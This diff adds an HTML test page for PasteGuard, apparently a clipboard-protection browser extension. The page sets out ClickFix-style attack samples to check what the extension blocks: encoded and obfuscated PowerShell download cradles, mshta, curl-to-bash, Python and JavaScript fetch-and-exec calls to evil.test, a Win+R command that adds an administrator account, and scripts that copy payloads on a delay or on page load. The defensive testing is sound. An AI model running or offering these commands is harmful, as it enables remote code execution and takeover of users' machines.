@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PasteGuard Test Page</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: system-ui, sans-serif;
+      background: #0f172a;
+      color: #e2e8f0;
+      padding: 32px;
+      max-width: 900px;
+      margin: 0 auto;
+    }
+    h1 { font-size: 24px; margin-bottom: 8px; color: #f8fafc; }
+    .subtitle { color: #94a3b8; margin-bottom: 32px; }
+    h2 {
+      font-size: 14px; text-transform: uppercase; letter-spacing: 0.05em;
+      color: #64748b; margin: 32px 0 12px; padding-bottom: 8px;
+      border-bottom: 1px solid #1e293b;
+    }
+    .card {
+      background: #1e293b; border-radius: 8px; padding: 16px 20px;
+      margin-bottom: 12px; border-left: 4px solid #334155;
+    }
+    .card.high { border-left-color: #ef4444; }
+    .card.med  { border-left-color: #f59e0b; }
+    .card.safe { border-left-color: #22c55e; }
+    .card .label {
+      font-size: 11px; font-weight: 600; text-transform: uppercase;
+      letter-spacing: 0.05em; margin-bottom: 6px;
+    }
+    .card.high .label { color: #ef4444; }
+    .card.med  .label { color: #f59e0b; }
+    .card.safe .label { color: #22c55e; }
+    .card p { font-size: 13px; color: #94a3b8; margin-bottom: 10px; }
+    code {
+      display: block; background: #0f172a; color: #cbd5e1; padding: 8px 12px;
+      border-radius: 4px; font-size: 12px; margin-bottom: 10px;
+      white-space: pre-wrap; word-break: break-all;
+    }
+    button {
+      padding: 8px 16px; border-radius: 6px; border: none;
+      font-size: 13px; font-weight: 500; cursor: pointer;
+      transition: background 0.15s;
+    }
+    .btn-copy {
+      background: #334155; color: #e2e8f0;
+    }
+    .btn-copy:hover { background: #475569; }
+    .btn-auto {
+      background: #7c2d12; color: #fecaca;
+    }
+    .btn-auto:hover { background: #9a3412; }
+    .result {
+      display: inline-block; margin-left: 10px; font-size: 12px;
+      color: #94a3b8; opacity: 0; transition: opacity 0.3s;
+    }
+    .result.show { opacity: 1; }
+    .note {
+      background: #1a1a2e; border: 1px solid #2d2d44; border-radius: 6px;
+      padding: 12px 16px; margin-top: 24px; font-size: 12px; color: #8b8fa3;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>PasteGuard Test Page</h1>
+  <p class="subtitle">Click the buttons below to trigger clipboard writes. PasteGuard should block the dangerous ones.</p>
+
+  <!-- ==================== HIGH confidence ==================== -->
+  <h2>HIGH Confidence — Should be blocked in Normal + Strict</h2>
+
+  <div class="card high">
+    <div class="label">PowerShell Encoded Command</div>
+    <p>Classic ClickFix payload — base64-encoded PowerShell.</p>
+    <code id="ps-enc">powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAHQAZQBzAHQALwBwAGEAeQBsAG8AYQBkACcAKQA=</code>
+    <button class="btn-copy" onclick="copyText('ps-enc')">Copy to Clipboard</button>
+    <span class="result" id="ps-enc-result"></span>
+  </div>
+
+  <div class="card high">
+    <div class="label">PowerShell Download Cradle</div>
+    <p>Downloads and executes a remote script via IEX.</p>
+    <code id="ps-dl">powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.test/payload.ps1')"</code>
+    <button class="btn-copy" onclick="copyText('ps-dl')">Copy to Clipboard</button>
+    <span class="result" id="ps-dl-result"></span>
+  </div>
+
+  <div class="card high">
+    <div class="label">LOLBin — mshta</div>
+    <p>Uses mshta to fetch and run a remote HTA file.</p>
+    <code id="lolbin">mshta http://evil.test/payload.hta</code>
+    <button class="btn-copy" onclick="copyText('lolbin')">Copy to Clipboard</button>
+    <span class="result" id="lolbin-result"></span>
+  </div>
+
+  <div class="card high">
+    <div class="label">curl | sh</div>
+    <p>Downloads and pipes directly into a shell.</p>
+    <code id="curl-sh">curl -sSL http://evil.test/install.sh | bash</code>
+    <button class="btn-copy" onclick="copyText('curl-sh')">Copy to Clipboard</button>
+    <span class="result" id="curl-sh-result"></span>
+  </div>
+
+  <div class="card high">
+    <div class="label">Python Remote Exec</div>
+    <p>Python one-liner that fetches and execs remote code.</p>
+    <code id="py-exec">python3 -c "import urllib.request; exec(urllib.request.urlopen('http://evil.test/p').read())"</code>
+    <button class="btn-copy" onclick="copyText('py-exec')">Copy to Clipboard</button>
+    <span class="result" id="py-exec-result"></span>
+  </div>
+
+  <!-- ==================== MEDIUM confidence ==================== -->
+  <h2>MEDIUM Confidence — Warned in Normal, blocked in Strict</h2>
+
+  <div class="card med">
+    <div class="label">JavaScript fetch + eval</div>
+    <p>Fetches remote code and evals it — "paste into DevTools" pattern.</p>
+    <code id="js-eval">fetch('http://evil.test/c').then(r=>r.text()).then(t=>eval(t))</code>
+    <button class="btn-copy" onclick="copyText('js-eval')">Copy to Clipboard</button>
+    <span class="result" id="js-eval-result"></span>
+  </div>
+
+  <div class="card med">
+    <div class="label">Hidden Unicode Characters</div>
+    <p>Looks innocent but contains zero-width characters that hide extra content.</p>
+    <code id="unicode-hide">echo "hello&#8203;&#8204;&#8205;&#8204;&#8203;&#8205;&#8204;&#8203; world"</code>
+    <button class="btn-copy" onclick="copyText('unicode-hide')">Copy to Clipboard</button>
+    <span class="result" id="unicode-hide-result"></span>
+  </div>
+
+  <div class="card med">
+    <div class="label">Run Dialog Instruction</div>
+    <p>Instructs the user to open Win+R and paste a command.</p>
+    <code id="winr">Press Win+R and paste: cmd /c "net user hacker P@ss123 /add && net localgroup administrators hacker /add"</code>
+    <button class="btn-copy" onclick="copyText('winr')">Copy to Clipboard</button>
+    <span class="result" id="winr-result"></span>
+  </div>
+
+  <div class="card med">
+    <div class="label">Heavy Obfuscation</div>
+    <p>Heavily concatenated and caret-escaped command.</p>
+    <code id="obfusc">p^o^w^e^r^s^h^e^l^l "('IEX')" + "(" + "New" + "-" + "Object" + " " + "Net" + "." + "Web" + "Client" + ")" + "." + "Down" + "load" + "String('http://evil.test')"</code>
+    <button class="btn-copy" onclick="copyText('obfusc')">Copy to Clipboard</button>
+    <span class="result" id="obfusc-result"></span>
+  </div>
+
+  <!-- ==================== Auto-copy (no user gesture) ==================== -->
+  <h2>Auto-Copy — No User Gesture (Strict mode should block)</h2>
+
+  <div class="card high">
+    <div class="label">Auto-copy on button click (delayed)</div>
+    <p>Clicking this button waits 2s then silently writes to clipboard — simulates a ClickFix attack where
+       the copy happens outside the user gesture window.</p>
+    <code>powershell -nop IEX(iwr http://evil.test/stage2)</code>
+    <button class="btn-auto" onclick="autoCopyDelayed()">Trigger Delayed Auto-Copy (2s)</button>
+    <span class="result" id="auto-delayed-result"></span>
+  </div>
+
+  <div class="card high">
+    <div class="label">Auto-copy on page load</div>
+    <p>This attempted to write to clipboard when the page loaded (no user gesture at all).
+       Check the result below.</p>
+    <span class="result show" id="auto-load-result" style="opacity:1">Waiting for page load test...</span>
+  </div>
+
+  <!-- ==================== SAFE (should pass) ==================== -->
+  <h2>SAFE — Should NOT be blocked</h2>
+
+  <div class="card safe">
+    <div class="label">Normal URL</div>
+    <code id="safe-url">https://example.com/page?id=123&ref=home</code>
+    <button class="btn-copy" onclick="copyText('safe-url')">Copy to Clipboard</button>
+    <span class="result" id="safe-url-result"></span>
+  </div>
+
+  <div class="card safe">
+    <div class="label">UUID / Invite Code</div>
+    <code id="safe-uuid">a1b2c3d4-e5f6-7890-abcd-ef1234567890</code>
+    <button class="btn-copy" onclick="copyText('safe-uuid')">Copy to Clipboard</button>
+    <span class="result" id="safe-uuid-result"></span>
+  </div>
+
+  <div class="card safe">
+    <div class="label">JSON Snippet</div>
+    <code id="safe-json">{"name": "John", "email": "john@example.com", "role": "admin"}</code>
+    <button class="btn-copy" onclick="copyText('safe-json')">Copy to Clipboard</button>
+    <span class="result" id="safe-json-result"></span>
+  </div>
+
+  <div class="card safe">
+    <div class="label">Code Snippet (harmless)</div>
+    <code id="safe-code">const sum = (a, b) => a + b;
+console.log(sum(2, 3));</code>
+    <button class="btn-copy" onclick="copyText('safe-code')">Copy to Clipboard</button>
+    <span class="result" id="safe-code-result"></span>
+  </div>
+
+  <div class="card safe">
+    <div class="label">Ctrl+C Selection Test</div>
+    <p style="user-select: all; background: #0f172a; padding: 8px 12px; border-radius: 4px; font-family: monospace; font-size: 12px; cursor: text; margin-bottom: 8px;">
+      Select this text and press Ctrl+C — it should copy normally without any warnings.
+    </p>
+  </div>
+
+  <div class="note">
+    <strong>How to use:</strong> Load the PasteGuard extension, then open this page.
+    Click each "Copy to Clipboard" button and check whether PasteGuard blocks, warns, or allows.
+    Toggle between Normal / Strict / Off in the popup to test each mode.
+    The auto-copy tests verify that clipboard writes without user gestures are caught.
+  </div>
+
+  <script>
+    // --- Copy via navigator.clipboard.writeText (user-initiated) ---
+    async function copyText(id) {
+      const el = document.getElementById(id);
+      const text = el.textContent;
+      const resultEl = document.getElementById(id + '-result');
+
+      try {
+        await navigator.clipboard.writeText(text);
+        showResult(resultEl, 'Copied (or quarantined)');
+      } catch (err) {
+        showResult(resultEl, 'Copy failed: ' + err.message);
+      }
+    }
+
+    // --- Delayed auto-copy (outside user gesture window) ---
+    function autoCopyDelayed() {
+      const resultEl = document.getElementById('auto-delayed-result');
+      showResult(resultEl, 'Waiting 2s...');
+
+      setTimeout(async () => {
+        try {
+          await navigator.clipboard.writeText(
+            'powershell -nop IEX(iwr http://evil.test/stage2)'
+          );
+          showResult(resultEl, 'Copied! (PasteGuard should have blocked this)');
+        } catch (err) {
+          showResult(resultEl, 'Blocked or failed: ' + err.message);
+        }
+      }, 2000);
+    }
+
+    // --- Auto-copy on page load (no gesture at all) ---
+    window.addEventListener('load', async () => {
+      const resultEl = document.getElementById('auto-load-result');
+      try {
+        await navigator.clipboard.writeText(
+          'mshta http://evil.test/auto-payload.hta'
+        );
+        resultEl.textContent = 'Auto-copied on load! (PasteGuard should have blocked this)';
+        resultEl.style.color = '#ef4444';
+      } catch (err) {
+        resultEl.textContent = 'Blocked or denied: ' + err.message;
+        resultEl.style.color = '#22c55e';
+      }
+    });
+
+    function showResult(el, msg) {
+      el.textContent = msg;
+      el.classList.add('show');
+      setTimeout(() => el.classList.remove('show'), 4000);
+    }
+  </script>
+</body>
+</html>
